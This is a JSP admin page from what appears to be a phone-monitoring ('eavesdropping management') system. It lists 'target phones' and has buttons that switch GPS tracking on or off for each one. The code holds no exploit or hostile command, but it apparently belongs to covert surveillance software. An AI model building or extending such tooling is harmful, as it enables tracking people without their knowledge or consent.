<%@ page language="java" pageEncoding="utf-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib uri="/WEB-INF/tld/SuperTag.tld" prefix="ui"%>
<%@ taglib uri="/WEB-INF/tld/sf.tld" prefix="sf"%>
<%
	String path = request.getContextPath();
	String basePath = request.getScheme() + "://"
			+ request.getServerName() + ":" + request.getServerPort()
			+ path;
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
		<title>手机监听管理系统</title>
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/webbase.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/main-layout.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/base-ui.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/table.css" />
		<link charset="utf-8" rel="stylesheet" 	href="<%=basePath%>/resource/bootstrap/css/bootstrap.min.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/dialog.css" />
		<script type="text/javascript" 	src="<%=basePath%>/resource/js/jquery-1.8.3.min.js"></script>
		<script type="text/javascript" src="<%=basePath%>/resource/bootstrap/js/bootstrap.min.js"></script>
		<script type="text/javascript" src="<%=basePath%>/resource/js/framework.js"></script>
		<script>
		
		
		
		  function doSetting(account,gps)
		  {
		      
		      if(gps=='0')
		      {
		      showProcess('正在开启，请稍后......');
		      }
		      if(gps=='1')
		      {
		      showProcess('正在关闭，请稍后......');
		      }
		      
		      $.post("<%=basePath%>/admin/user_modify.action", {account:account,gps:gps},
					function(data){
					
					  if(gps=='0')
				      {
				      showSTip("开启成功");
				      }
				      if(gps=='1')
				      {
				      showSTip("关闭成功");
				      }
					document.getElementById('searchForm').submit();
			  });
		  }
		</script>
	</head>
	<body class="web-app ui-selectable">


		<%@include file="../header.jsp"%>

		<%@include file="../nav.jsp"%>

		<div id="mainWrapper">
			<div class="panel panel-default">
				<div class="panel-heading">
					GPS开关设置
				</div>
				<div class="panel-body" style="padding: 5px;">
					<form action="<%=basePath%>/admin/user_gpsManage.action" method="post"
						id="searchForm" style="padding: 0px;">
						<input type="hidden" name="currentPage" id="currentPage" />
						<table style="width: 100%" class="utable">

							<thead>
								<tr class="tableHeader">
								    <th width="30%">目标手机</th>
									<th width="30%">GPS状态</th>
									<th width="40%">操作</th>
								</tr>
								 
							</thead>
							<tbody id="checkPlanList">

								<c:forEach var="user" items="${page.dataList}">
								   <c:if test="${user.account ne 'admin'}">
									<tr id="${user.account}">
										<td>
											${user.mobile }
										</td>
										<td>
										   <c:if test="${user.gps eq null || user.gps eq '0'}">
										      <span class="label label-success">已开启</span>
										   </c:if>
										   
										   <c:if test="${user.gps eq  '1'}">
										     <span class="label label-danger">已关闭</span>
										   </c:if>
											
										</td>
										 
										<td>
										 
											
											  <c:if test="${user.gps eq null || user.gps eq '0'}">
										        <button type="button" class="btn btn-danger" style="padding: 5px;" onclick="doSetting('${user.account}','1')">关闭</button>
										      </c:if>
											 
											  <c:if test="${user.gps eq  '1'}">
										      <button type="button" class="btn btn-success" style="padding: 5px;" onclick="doSetting('${user.account}','0')">开启</button>
										      </c:if>
	 
										</td>
									</tr>
								</c:if>
								</c:forEach>
								 

							</tbody>
							<tfoot>
								 
							</tfoot>
						</table>
					</form>

				</div>
			</div>
		 
		<script>
		       $('#gpsManageMenu').addClass('current');
		     
		</script>
	</body>
</html>
